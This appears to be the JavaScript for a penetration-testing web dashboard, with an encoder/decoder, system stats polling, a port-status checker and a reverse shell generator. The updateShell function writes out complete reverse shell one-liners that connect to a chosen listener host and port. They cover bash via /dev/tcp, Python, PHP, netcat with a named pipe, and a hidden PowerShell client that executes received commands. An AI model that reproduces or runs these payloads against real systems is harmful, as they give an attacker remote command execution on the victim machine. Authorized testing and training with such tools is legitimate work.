// Helper to copy text to clipboard
function copyToClipboard(id) {
    const element = document.getElementById(id);
    let text;
    if (element.tagName === 'TEXTAREA' || element.tagName === 'INPUT') {
        text = element.value;
    } else {
        text = element.innerText;
    }
    
    navigator.clipboard.writeText(text).then(() => {
        const btn = event.currentTarget;
        const originalHtml = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => {
            btn.innerHTML = originalHtml;
        }, 2000);
    });
}

// Encoder/Decoder logic
function handleCodec(action) {
    const input = document.getElementById('codec-input').value;
    const output = document.getElementById('codec-output');
    
    try {
        if (action === 'b64-enc') {
            output.value = btoa(input);
        } else if (action === 'b64-dec') {
            output.value = atob(input);
        } else if (action === 'url-enc') {
            output.value = encodeURIComponent(input);
        } else if (action === 'url-dec') {
            output.value = decodeURIComponent(input);
        }
    } catch (e) {
        output.value = "Error: " + e.message;
    }
}

// Reverse Shell Generator logic
function updateShell() {
    const lhost = document.getElementById('lhost')?.value || '127.0.0.1';
    const lport = document.getElementById('lport')?.value || '4444';
    const type = document.getElementById('shell-type')?.value;
    const output = document.getElementById('shell-output');
    
    if (!output) return;

    let command = '';
    switch(type) {
        case 'bash':
            command = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
            break;
        case 'python':
            command = `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`;
            break;
        case 'php':
            command = `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/bash -i <&3 >&3 2>&3");'`;
            break;
        case 'nc':
            command = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
            break;
        case 'ps':
            command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
            break;
    }
    output.innerText = command;
}

// Add event listeners for shell generator
document.addEventListener('DOMContentLoaded', () => {
    const shellInputs = ['lhost', 'lport', 'shell-type'];
    shellInputs.forEach(id => {
        document.getElementById(id)?.addEventListener('input', updateShell);
        document.getElementById(id)?.addEventListener('change', updateShell);
    });

    // Initial stats update
    if (document.getElementById('cpu-text')) {
        updateStats();
        setInterval(updateStats, 5000);
    }
});

// System Stats update
async function updateStats() {
    try {
        const response = await fetch('/api/stats');
        const data = await response.json();
        
        document.getElementById('cpu-text').innerText = data.cpu + '%';
        document.getElementById('cpu-bar').style.width = data.cpu + '%';
        
        document.getElementById('ram-text').innerText = data.ram + '%';
        document.getElementById('ram-bar').style.width = data.ram + '%';
        
        document.getElementById('disk-text').innerText = data.disk + '%';
        document.getElementById('disk-bar').style.width = data.disk + '%';
        
        document.getElementById('temp-text').innerText = data.temp + (data.temp !== 'N/A' ? '°C' : '');
        document.getElementById('ip-text').innerText = data.ip;
    } catch (e) {
        console.error("Failed to fetch stats", e);
    }
}

// Target Status Check
async function checkStatus() {
    const target = document.getElementById('target-ip').value;
    const port = document.getElementById('target-port').value;
    const btn = document.getElementById('check-btn');
    const results = document.getElementById('status-results');
    
    if (!target) return;
    
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Checking...';
    
    try {
        const response = await fetch('/api/target_check', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({target, port})
        });
        const data = await response.json();
        
        const timestamp = new Date().toLocaleTimeString();
        const statusHtml = `
            <div class="list-group-item bg-transparent text-light border-secondary d-flex justify-content-between align-items-center py-2">
                <div>
                    <span class="fw-bold">${data.target}:${data.port}</span>
                    <small class="text-secondary ms-2">${timestamp}</small>
                </div>
                <span class="badge ${data.open ? 'bg-success' : 'bg-danger'}">${data.open ? 'OPEN' : 'CLOSED'}</span>
            </div>
        `;
        
        if (results.querySelector('p')) {
            results.innerHTML = statusHtml;
        } else {
            results.insertAdjacentHTML('afterbegin', statusHtml);
        }
    } catch (e) {
        alert("Check failed: " + e.message);
    } finally {
        btn.disabled = false;
        btn.innerHTML = 'Check';
    }
}
